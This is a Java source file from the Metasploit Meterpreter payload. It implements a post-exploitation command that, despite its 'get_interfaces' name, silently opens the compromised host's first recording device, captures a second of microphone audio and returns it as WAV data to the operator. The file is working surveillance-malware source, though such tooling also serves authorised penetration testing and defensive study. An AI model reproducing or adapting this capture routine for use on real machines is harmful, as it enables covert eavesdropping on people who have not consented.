package com.metasploit.meterpreter.stdapi;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;

import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Line;
import javax.sound.sampled.Mixer;
import javax.sound.sampled.TargetDataLine;
import javax.sound.sampled.Mixer.Info;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.sun.media.sound.WaveFileWriter;

@SuppressWarnings("restriction")
public class stdapi_sys_audio_get_interfaces_V1_4 implements Command {
	
	private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_AUDIO_DURATION = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 1);
    private static final int TLV_TYPE_AUDIO_DATA = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 2);
	
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
//    	Mixer.Info[] mixerInfo = AudioSystem.getMixerInfo();
//    	Line.Info[][] lineInfos = new Line.Info[mixerInfo.length][];
//        for (int i = 0; i < mixerInfo.length; i++) {
//            Mixer mixer = AudioSystem.getMixer(mixerInfo[i]);
//            lineInfos[i] = mixer.getTargetLineInfo();
//        }
//        response.add(TLVType.TLV_TYPE_STRING, lineInfos.toString());
//        return ERROR_SUCCESS;
    	
//    	response.add(TLVType.TLV_TYPE_STRING, "hello");
//        return ERROR_SUCCESS;
    	
    	
    	int duration = 1;
    	//int duration = request.getIntValue(TLV_TYPE_AUDIO_DURATION);
        TargetDataLine line = null;
        Info[] mixerInfo = AudioSystem.getMixerInfo();
        for (int i = 0; i < mixerInfo.length; i++) {
            Mixer mixer = AudioSystem.getMixer(mixerInfo[i]);
            Line.Info[] targetLineInfo = mixer.getTargetLineInfo();
            if (targetLineInfo.length > 0) {
                line = (TargetDataLine) mixer.getLine(targetLineInfo[0]);
                break;
            }
        }
        if (line == null)
            throw new UnsupportedOperationException("No recording device found");
        AudioFormat af = new AudioFormat(11000, 8, 1, true, false);
        line.open(af);
        line.start();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[(int) af.getSampleRate() * af.getFrameSize()];
        long end = System.currentTimeMillis() + 1000 * duration;
        int len;
        while (System.currentTimeMillis() < end && ((len = line.read(buf, 0, buf.length)) != -1)) {
            baos.write(buf, 0, len);
        }
        line.stop();
        line.close();
        baos.close();
        AudioInputStream ais = new AudioInputStream(new ByteArrayInputStream(baos.toByteArray()), af, baos.toByteArray().length);
        ByteArrayOutputStream wavos = new ByteArrayOutputStream();
        new WaveFileWriter().write(ais, AudioFileFormat.Type.WAVE, wavos);
        response.add(TLV_TYPE_AUDIO_DATA, wavos.toByteArray());
        return ERROR_SUCCESS;
    }
    
    
//    public static void main(String[] args){
//    	System.out.println("hellozimhere");
//    	stdapi_sys_audio_get_interfaces_V1_4 ifaces = new stdapi_sys_audio_get_interfaces_V1_4();
//    	try {
//			System.out.println(ifaces.execute(null, null, new TLVPacket()));
//		} catch (Exception e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
//    }
}